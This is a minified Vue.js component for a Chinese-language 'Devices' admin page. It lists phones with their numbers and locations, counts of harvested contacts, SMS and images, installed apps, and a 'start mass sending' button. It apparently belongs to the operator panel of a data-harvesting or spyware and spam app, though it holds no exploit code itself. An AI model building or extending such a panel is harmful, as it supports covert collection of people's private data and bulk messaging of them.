import{d as N,h as p,j as T,k as V,l as $,f as k,o as v,e as l,p as S,a,q as j,c as A,w as i,r,t as s,b as u,n as C,_ as M}from"./index-BHZT7A5w.js";const Q={key:0,class:"timer"},q={key:0},E=N({__name:"Devices",setup(F){const d=p([]),m=p(!1),g=p(1),f=p(10),b=T(()=>{const e=(g.value-1)*f.value,n=e+f.value;return d.value.slice(e,n)});function y(e){g.value=e}function z(e){d.value=d.value.filter(n=>n.id!==e)}function D(e){e.sending=!0,e.countdown=300,e.timer=setInterval(()=>{e.countdown>0?e.countdown--:clearInterval(e.timer)},1e3)}function x(e){e.timer&&clearInterval(e.timer)}function I(e){e.countdown>0&&(e.timer=setInterval(()=>{e.countdown>0?e.countdown--:clearInterval(e.timer)},1e3))}return V(async()=>{d.value=[{id:"D001",model:"iPhone 14 Pro",phone:"13800138000",loginTime:"2025-09-20 10:00:00",location:"北京",contacts:120,sms:45,images:200,apps:["微信","支付宝","抖音"]},{id:"D002",model:"华为 Mate 50",phone:"13900139000",loginTime:"2025-09-20 11:30:00",location:"上海",contacts:80,sms:30,images:150,apps:["QQ","淘宝","B站"]}];try{m.value=!0;const e=await $.get("/devices");d.value.push(...e.data)}catch(e){console.error("获取设备失败",e)}finally{m.value=!1}}),(e,n)=>{const c=r("el-table-column"),o=r("el-button"),P=r("el-table"),B=r("el-pagination"),h=j("loading");return v(),k("div",null,[n[7]||(n[7]=l("h3",null,"设备列表",-1)),S((v(),A(P,{data:b.value,style:{width:"100%"}},{default:i(()=>[a(c,{label:"设备信息"},{default:i(({row:t})=>[l("div",null,[l("div",null,"型号："+s(t.model),1),l("div",null,"手机号："+s(t.phone),1),l("div",null,"ID："+s(t.id),1),l("div",null,"登录时间："+s(t.loginTime),1),l("div",null,"位置："+s(t.location),1)])]),_:1}),a(c,{label:"数量"},{default:i(({row:t})=>[l("div",null,"通讯录："+s(t.contacts),1),l("div",null,"短信："+s(t.sms),1),l("div",null,"图片："+s(t.images),1),l("div",null,"App："+s(t.apps.length),1)]),_:1}),a(c,{label:"已安装APP"},{default:i(({row:t})=>[l("span",null,s(t.apps.join("、")),1)]),_:1}),a(c,{label:"操作"},{default:i(({row:t})=>[a(o,{size:"small"},{default:i(()=>[...n[0]||(n[0]=[u("通讯录",-1)])]),_:1}),a(o,{size:"small"},{default:i(()=>[...n[1]||(n[1]=[u("短信",-1)])]),_:1}),a(o,{size:"small"},{default:i(()=>[...n[2]||(n[2]=[u("图片",-1)])]),_:1})]),_:1}),a(c,{label:"功能"},{default:i(({row:t})=>[a(o,{size:"small",type:"danger",onClick:_=>z(t.id)},{default:i(()=>[...n[3]||(n[3]=[u("删除用户",-1)])]),_:1},8,["onClick"]),a(o,{size:"small",type:"primary",onClick:_=>D(t)},{default:i(()=>[...n[4]||(n[4]=[u("开始群发",-1)])]),_:1},8,["onClick"]),t.sending?(v(),k("div",Q,[l("span",null,"倒计时："+s(t.countdown)+"s",1),a(o,{size:"mini",onClick:_=>x(t)},{default:i(()=>[...n[5]||(n[5]=[u("暂停",-1)])]),_:1},8,["onClick"]),a(o,{size:"mini",onClick:_=>I(t)},{default:i(()=>[...n[6]||(n[6]=[u("继续",-1)])]),_:1},8,["onClick"]),t.countdown===0?(v(),k("span",q,"正在发送")):C("",!0)])):C("",!0)]),_:1})]),_:1},8,["data"])),[[h,m.value]]),a(B,{background:"",layout:"prev, pager, next","current-page":g.value,"page-size":f.value,total:d.value.length,onCurrentChange:y,style:{"margin-top":"12px","text-align":"right"}},null,8,["current-page","page-size","total"])])}}}),H=M(E,[["__scopeId","data-v-2e240e6c"]]);export{H as default};
